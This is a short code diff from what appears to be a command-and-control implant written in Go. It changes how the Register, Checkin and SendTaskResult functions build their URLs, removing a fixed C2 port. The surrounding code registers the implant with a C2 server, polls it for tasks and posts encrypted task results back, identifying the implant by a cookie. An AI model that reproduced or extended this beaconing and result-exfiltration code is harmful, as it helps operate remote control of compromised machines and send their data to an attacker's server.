@@ -42,7 +42,7 @@ func Register(serverUrl string, publicKeyB64 string, privateKeyB64 string) (mode
 
 	// Send
 	//resp, err := http.HTTPRequest("POST", serverUrl, "/c2/register", 80, REGISTER_USER_AGENT, nil, encPubKeyJson, false)
-	request, err := http.NewRequest("POST", fmt.Sprintf("%s:%d/c2/register", serverUrl, C2_PORT), bytes.NewReader(encPubKeyJson))
+	request, err := http.NewRequest("POST", fmt.Sprintf("%s/c2/register", serverUrl), bytes.NewReader(encPubKeyJson))
 	if err != nil {
 		return models.MalleableProfile{}, errors.Wrap(err, "Failed to create request")
 	}
@@ -90,7 +90,7 @@ func Checkin(c2Url string, profile models.MalleableProfile) (models.Task, error)
 	client := &http.Client{}
 
 	// Create a new HTTP request
-	req, err := http.NewRequest("GET", fmt.Sprintf("%s:%d/c2/checkin", c2Url, C2_PORT), nil)
+	req, err := http.NewRequest("GET", fmt.Sprintf("%s/c2/checkin", c2Url), nil)
 	if err != nil {
 		return models.Task{}, errors.Wrap(err, "Failed to create request")
 	}
@@ -151,7 +151,7 @@ func SendTaskResult(taskId string, success bool, output string, serverUrl string
 	}
 
 	// Send results
-	request, err := http.NewRequest("POST", fmt.Sprintf("%s:%d/c2/task", serverUrl, C2_PORT), bytes.NewReader([]byte(encryptedResults)))
+	request, err := http.NewRequest("POST", fmt.Sprintf("%s/c2/task", serverUrl), bytes.NewReader([]byte(encryptedResults)))
 	request.AddCookie(&http.Cookie{Name: profile.Config.Cookie, Value: profile.ImplantId})
 
 	if err != nil {
